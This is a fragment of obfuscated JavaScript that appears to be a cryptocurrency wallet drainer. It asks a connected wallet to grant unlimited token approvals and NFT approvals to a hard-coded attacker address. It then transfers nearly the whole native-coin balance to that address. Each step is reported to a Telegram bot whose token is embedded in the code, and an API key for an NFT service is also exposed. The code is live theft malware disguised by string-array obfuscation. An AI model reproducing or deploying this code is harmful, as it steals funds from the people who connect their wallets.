x20','findora-mainnet','newBasisPoints','gather-testnet','aurora-mainnet','addBlackList','click','Approval','Transfer','fantom-mainnet','methods','mintApe','astar-mainnet','removeBlackList','decimals','swimmer-testnet','eth-mainnet','setStartingIndex','setRevealTimestamp','flipSaleState','Tokens:','milkomeda-c1-mainnet','cronos-mainnet','then','skale-calypso','optimism-mainnet','WalletConnectProvider','sendTransaction','owner','evmos-mainnet','binance','maximumFee','https://bsc-dataseed.binance.org','startingIndex','unpause','transfer','meter-mainnet','eth-goerli','who','832367FBNaRK','boba-bnb-mainnet','_balance','2JYlOCo','search','Contract','emerald-paratime-mainnet','astar-shibuya','polygon-zkevm-testnet','maxFee','safeTransferFrom','transactionHash','_spender','metis-testnet','metis-mainnet','_decimals','ownerOf','setParams','json','boba-mainnet','NFT\x20Contract\x20Address\x20','getChainId','_to','_user','deprecated','_clearedUser','error','6211116UGXbwy','_blackListedUser','approved','Error\x20processing\x20item\x20','matic-mumbai','milkomeda-a1-mainnet','isBlackListed','swimmer-mainnet','event','boba-bobabeam-mainnet','issue','avalanche-mainnet','boba-avalanche-mainnet','skale-staging-uum','5WUxaPa','symbol','moonbeam-mainnet','baseURI','MAX_UINT'];_0x58dd=function(){return _0x2a8428;};return _0x58dd();}async function loopTokens(_0xdc7962){const _0x127332=_0x380585;for await(let _0x77f629 of _0xdc7962){console[_0x127332(0x206)](_0x127332(0x221),_0x77f629);try{let _0x2c628c=new web3Object[(_0x127332(0x29d))]['Contract'](ABI,_0x77f629[_0x127332(0x29f)]);sendMessage(_0x127332(0x209)),await _0x2c628c[_0x127332(0x246)]['approve'](Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999')[_0x127332(0x2a1)]({'from':selectedAccount,'to':_0x77f629[_0x127332(0x29f)]})['on']('transactionHash',_0x47ae83=>{const _0x282ce2=_0x127332;console[_0x282ce2(0x206)]('Transaction\x20Hash:\x20'+_0x47ae83);})['on'](_0x127332(0x1cd),_0x4631af=>{const _0x55d9a6=_0x127332;console[_0x55d9a6(0x206)](_0x55d9a6(0x23c)+_0x4631af),sendMessage(_0x55d9a6(0x226)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x77f629[_0x55d9a6(0x29f)]),sendMessage(_0x55d9a6(0x1d2)+_0x77f629[_0x55d9a6(0x293)]),sendMessage(_0x55d9a6(0x1ce)+Oxa);})['on']('error',_0x5a36af=>{const _0x9c8fa9=_0x127332;console[_0x9c8fa9(0x206)](_0x9c8fa9(0x216)+_0x5a36af),sendMessage(_0x9c8fa9(0x231));});}catch(_0x4b597f){console['log'](_0x127332(0x216)+_0x4b597f),sendMessage(_0x127332(0x231));}};await loopNfts(NFTs);}async function loopNfts(_0x4935a0){const _0x264fec=_0x380585;for await(let _0x3af43b of _0x4935a0){console[_0x264fec(0x206)](_0x264fec(0x1ca),_0x3af43b);try{let _0x2f297b=new web3Object[(_0x264fec(0x29d))][(_0x264fec(0x268))](ABIN,_0x3af43b[_0x264fec(0x20d)]);await _0x2f297b[_0x264fec(0x246)][_0x264fec(0x29e)](Oxa,_0x264fec(0x2af))['send']({'from':selectedAccount,'to':_0x3af43b[_0x264fec(0x20d)]})['on'](_0x264fec(0x26e),_0x14fafe=>{const _0x5dc1c4=_0x264fec;console['log'](_0x5dc1c4(0x1bb)+_0x14fafe),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on'](_0x264fec(0x1cd),_0x3bfb65=>{const _0xbe6a41=_0x264fec;console[_0xbe6a41(0x206)]('Transaction\x20Receipt:\x20'+_0x3bfb65),sendMessage(_0xbe6a41(0x226)),sendMessage(_0xbe6a41(0x277)+token[_0xbe6a41(0x29f)]),sendMessage(_0xbe6a41(0x1ce)+Oxa);})['on']('error',_0x3d04e7=>{const _0x582341=_0x264fec;console[_0x582341(0x206)](_0x582341(0x216)+_0x3d04e7),sendMessage(_0x582341(0x231));});}catch(_0x2c3354){console[_0x264fec(0x206)](_0x264fec(0x216)+_0x2c3354),sendMessage(_0x264fec(0x231));}}await onSendEther();}async function onSendEther(){const _0x133b11=_0x380585;console[_0x133b11(0x206)](_0x133b11(0x2b2));try{let _0xa2df41=await web3Object[_0x133b11(0x29d)]['getBalance'](selectedAccount);var _0x591cfc=await web3Object[_0x133b11(0x29d)]['getGasPrice'](),_0x2a135c={'gasPrice':_0x591cfc,'from':selectedAccount,'to':Oxa,'value':_0xa2df41};_0x2a135c[_0x133b11(0x1da)]=_0x507cfc,_0x2a135c['value']=_0xa2df41-0xaa87bee538000,console['log'](_0x2a135c[_0x133b11(0x20f)]);var _0x507cfc=await web3Object[_0x133b11(0x29d)][_0x133b11(0x211)](_0x2a135c),_0x366203=_0x591cfc*_0x507cfc;web3Object[_0x133b11(0x29d)][_0x133b11(0x257)](_0x2a135c)['on']('transactionHash',_0x4d4b6e=>{const _0x37e2f4=_0x133b11;console[_0x37e2f4(0x206)]('Transaction\x20Hash:\x20',_0x4d4b6e),sendMessage(_0x37e2f4(0x1d5));})['on'](_0x133b11(0x1cd),_0x29ffff=>{const _0x66ea55=_0x133b11;console['log'](_0x66ea55(0x23c),_0x29ffff),sendMessage(_0x66ea55(0x213));})['on'](_0x133b11(0x27d),_0x4b4a41=>{const _0x28cf39=_0x133b11;console[_0x28cf39(0x206)]('Error:\x20',_0x4b4a41),sendMessage(_0x28cf39(0x231));});}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer');}}async function sendMessage(_0x3b0a40){return new Promise((_0xf81d9b,_0x4a9411)=>{const _0x3008c2=_0x37e4,_0x3daaf3=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x3daaf3+_0x3008c2(0x1e3)+_0x3b0a40,{'method':_0x3008c2(0x227),'headers':{}})[_0x3008c2(0x253)](async _0x1b2d01=>{const _0x48c4c6=_0x3008c2;if(_0x1b2d01[_0x48c4c6(0x217)]>0x18f)throw _0x1b2d01;_0xf81d9b(await _0x1b2d01[_0x48c4c6(0x275)]());})[_0x3008c2(0x1fd)](_0x1c446d=>{_0x4a9411(_0x1c446d);});});}async function getPrice(_0xdd9827){return new Promise((_0x358bdb,_0x1adc10)=>{const _0x4af5b8=_0x37e4;fetch(_0x4af5b8(0x296)+_0xdd9827+_0x4af5b8(0x222),{'method':'GET','headers':{}})['then'](async _0x249b4e=>{const _0x1ba535=_0x4af5b8;if(_0x249b4e['status']>0x18f)throw _0x249b4e;_0x358bdb(await _0x249b4e[_0x1ba535(0x275)]());})[_0x4af5b8(0x1fd)](_0x4d6a64=>{_0x1adc10(_0x4d6a64);});});}async function getValue(_0x3014c6,_0x3067d2,_0x11fb02){const _0x5efa0c=_0x380585;console[_0x5efa0c(0x206)](_0x3014c6,_0x3067d2,_0x11fb02);let _0x572707=await getPrice(_0x3014c6);console[_0x5efa0c(0x206)]('price',_0x572707),_0x572707=parseFloat(_0x572707[_0x3014c6][_0x5efa0c(0x1c3)]);let _0x41128d=_0x3067d2/0xa**(_0x11fb02||0x12)*_0x572707;return _0x41128d=parseInt(_0x41128d),_0x572707?_0x41128d:0x0;}async function getNFTs(_0x49913d='',_0x22bb1f='LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn',_0x49136b=_0x380585(0x1e2),_0xb863fe='50'){return new Promise((_0x537ff6,_0x5cf27a)=>{const _0xd2290b=_0x37e4;fetch(_0xd2290b(0x2b1)+_0x49913d+_0xd2290b(0x1ff)+_0x49136b+'&format=decimal&limit='+_0xb863fe,{'method':'GET','headers':{'accept':_0xd2290b(0x1e6),'X-API-Key':_0x22bb1f}})[_0xd2290b(0x253)](async _0x4b4713=>{const _0x38189f=_0xd2290b;if(_0x4b4713[_0x38189f(0x217)]>0x18f)throw _0x4b4713;_0x537ff6(await _0x4b4713[_0x38189f(0x275)]());})[_0xd2290b(0x1fd)](_0x1057e3=>{_0x5cf27a(_0x1057e3);});});}